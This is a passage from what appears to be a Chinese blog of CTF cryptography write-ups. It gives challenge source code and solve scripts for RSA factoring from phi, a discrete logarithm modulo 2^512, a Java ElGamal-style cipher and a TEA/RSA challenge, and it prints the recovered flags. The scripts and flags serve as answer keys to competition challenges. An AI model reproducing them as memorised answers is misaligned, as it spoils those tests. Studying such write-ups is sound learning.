string">'['</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token number">9433451661749413225919414595243321311762902037908850954799703396083863718641136503053215995576558003171249192969972864840795298784730553210417983714593764557582927434784915177639731998310891168685999240937407871771369971713515313634198744616074610866924094854671900334810353127446778607137157751925680243990905528141072864168544519279897224494849206184262202130305820187569148057247731243651084258194009459936702909655448969693589800987266378249891157940262898554047247605049549997783511107373248462587318323152524969684724690316918761387154882496367769626921299091688377118938693074486325995308403232228282839975697</span>phi<span class="token operator">=</span><span class="token number">9433451661749413225919414595243321311762902037908850954799703396083863718641136503053215995576558003171249192969972864840795298784730553210417983714593764557582927434784915177639731998310891168685999240937407871771369971713515313634198744616074610866924094854671900334810353127446778607137157751925680243990711180904598841255660443214091848674376245163953774717113246203928244509033734184913005865837620134831142880711832256634797590773413831659733615722574830257496801417760337073484838170554497953033487131634973371143357507027731899402777169516770264218656483487045393156894832885628843858316679793205572348688820</span>p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>symbols<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>symbols<span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span>res <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>p<span class="token operator">*</span>q<span class="token operator">-</span>n<span class="token punctuation">,</span> p<span class="token operator">+</span>q<span class="token operator">-</span><span class="token punctuation">(</span>n<span class="token operator">-</span>phi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print (res)#这里得到下面的p，q</span>p<span class="token operator">=</span><span class="token number">100216711979082556377200124903474313599976321274816484378304672662900171906266478070844182716079881540999761528986068197079878654411887736955737660906283803174161740862819849415729979371880583995409044839777513091451849412985192528374337852907661670174530234397743068706607004213367391908429077794527921775907</span>q<span class="token operator">=</span><span class="token number">94130524494940356506875940901901506872984699033610928814269310978003376307730580667234209640309443564560267414630644861712331559440658853201804556781784493376284446426393074882942957446869925558422146677774085449915333876201669456003375126689843738090285370245240893337253184644114745083294361228182569510971</span>d<span class="token operator">=</span>final_contente <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span>m <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> x <span class="token keyword">in</span> d<span class="token punctuation">:</span>  k <span class="token operator">=</span> pow<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># print(pow(k, 2, p*q))</span>  <span class="token comment" spellcheck="true"># print(x)</span>  <span class="token keyword">if</span> pow<span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span> <span class="token operator">==</span> int<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#因为是读文件出来的x，都是字符串，所有要int转为整数，不然整数和字符串不相等，就出现问题了。</span>    m <span class="token operator">+=</span> <span class="token string">"0"</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    m <span class="token operator">+=</span> <span class="token string">"1"</span><span class="token comment" spellcheck="true"># print (m)</span>m<span class="token operator">=</span>int<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-you-raise-me-up（2020网鼎杯青龙组）"><a href="#3-3-you-raise-me-up（2020网鼎杯青龙组）" class="headerlink" title="3.3  you_raise_me_up（2020网鼎杯青龙组）"></a>3.3  you_raise_me_up<code>（2020网鼎杯青龙组）</code></h2><p><strong>考点：离散对数</strong></p><p><strong>题目源码：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'m = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'c = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><span class="token comment" spellcheck="true"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>解法1：</strong></p><p>离散对数问题，直接用sage求解，脚本如下： </p><pre><code>m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499n = 2**512m = Mod(m,n)c = Mod(c,n)flag=discrete_log(c,m)# flag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757print(long_to_bytes(flag))# flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}</code></pre><p><strong>解法2：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span>c <span class="token operator">=</span> <span class="token number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span>n <span class="token operator">=</span> <span class="token number">2</span>phi <span class="token operator">=</span> <span class="token number">1</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">513</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">*=</span> <span class="token number">2</span>    phi <span class="token operator">*=</span> <span class="token number">2</span>    candidate <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> c <span class="token operator">%</span> n<span class="token punctuation">:</span>            candidate<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token operator">+</span> phi <span class="token keyword">for</span> x <span class="token keyword">in</span> candidate<span class="token punctuation">]</span> <span class="token operator">+</span> candidate<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-easy-crypto（2020HK）"><a href="#3-4-easy-crypto（2020HK）" class="headerlink" title="3.4 easy_crypto（2020HK）"></a>3.4 easy_crypto<code>（2020HK）</code></h2><p>做这道题的原因是想学习下java语言，开搞！！</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>java基础-BigInteger的使用  <a href="https://blog.csdn.net/suyebiubiu/article/details/78511556" target="_blank" rel="noopener">https://blog.csdn.net/suyebiubiu/article/details/78511556</a></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>math<span class="token punctuation">.</span>BigInteger<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Random<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">crypto</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> BigInteger e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"114514"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//直接将十进制的字符串格式变成大整数</span>    <span class="token keyword">static</span> BigInteger p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"486782758980265419106566437773662434821707849903209898358740381800342941420169184139234071329598394271286443155137316343275438967772601578029350778343911038446374408250"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> BigInteger h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"197285815436451554701121357540207727760367215453670717073481761209255345336604283966933286154040618892010511454547717773622062607956598784296775952923998110257788108099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> String table <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"0123456789abcdefghijklnmopqrstuvwxyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">Enc</span><span class="token punctuation">(</span>String plaintext<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        BigInteger<span class="token punctuation">[</span><span class="token punctuation">]</span> cipher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        plaintext <span class="token operator">=</span> plaintext<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BigInteger r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String rtext <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rtext<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> rlen <span class="token operator">=</span> rtext<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String text <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> plaintext<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">%</span> rlen<span class="token punctuation">;</span>            text <span class="token operator">+=</span> table<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>Character<span class="token punctuation">.</span><span class="token function">getNumericValue</span><span class="token punctuation">(</span>rtext<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        BigInteger bText <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">modPow</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>        cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">.</span><span class="token function">modPow</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>bText<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"||"</span><span class="token operator">+</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception    <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Welcome to l3hsec, here is the flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String str1 <span class="token operator">=</span> <span class="token string">"This is the flag"</span><span class="token punctuation">;</span>        String str2 <span class="token operator">=</span> <span class="token function">Enc</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// d4e03ge7tgvd3okpxq1l83w65q7vs55iwcav9ftehw9xtgfkn3oc3ofl2b52c6yjzl0jkn4xl83joqxlq023sacnpeddvq46709bz8kye1da||2h1oufyowds4axcoim3trm3kqm2hwlgbnrnblznktu4960o7hek0n9xgm9h1qfqq5w9k2i8wifbqv22c1mg8a79vwf8z6ydddbghvy3qzyq6jprbsjcv4o3ftwk5nmi</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-easy-ya（2020网鼎杯青龙组）"><a href="#3-5-easy-ya（2020网鼎杯青龙组）" class="headerlink" title="3.5 easy_ya（2020网鼎杯青龙组）"></a>3.5 easy_ya<code>（2020网鼎杯青龙组）</code></h2><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://badmonkey.site/archives/wangdingcup-2020.html" target="_blank" rel="noopener">https://badmonkey.site/archives/wangdingcup-2020.html</a></p><p><strong>题目源码：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>key<span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s<span class="token punctuation">,</span>s2n<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrimelimit <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> n <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>padding<span class="token operator">=</span><span class="token string">"\xe6\xe6\xe7\xe6\xe5\xe6\xe5\xe9\xe5"</span>ek<span class="token operator">=</span><span class="token string">'\xe6\x84\xbf'</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    pad  <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0x10000000</span><span class="token punctuation">,</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span>    Key  <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">]</span>    Data <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>    a <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Key<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Key<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Key<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Key<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    z <span class="token operator">=</span> limit<span class="token punctuation">(</span><span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>Data<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Data<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    pads <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pads <span class="token operator">=</span> limit<span class="token punctuation">(</span>pads <span class="token operator">+</span> pad<span class="token punctuation">)</span>        y <span class="token operator">=</span> limit<span class="token punctuation">(</span> y <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">*</span><span class="token number">16</span> <span class="token operator">+</span> a<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">+</span> pads<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        z <span class="token operator">=</span> limit<span class="token punctuation">(</span> z <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token number">16</span> <span class="token operator">+</span> c<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">+</span> pads<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>pads <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pow_check()</span><span class="token comment" spellcheck="true">#token_check()</span>flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">-</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encode<span class="token punctuation">(</span>key<span class="token punctuation">,</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ek<span class="token operator">+=</span>padding<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">0x10001</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    q<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>    n<span class="token operator">=</span>p<span class="token operator">*</span>q    <span class="token keyword">print</span> n    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>s2n<span class="token punctuation">(</span>ek<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-study"><a href="#4-study" class="headerlink" title="4.  study"></a>4.  study</h1><p>数论学习  <a href="https://peonycsa.com/mathjax-in-hexo/" target="_blank" rel="noopener">https://peonycsa.com/mathjax-in-hexo/</a></p><p>CTF密码学方法总结   <a 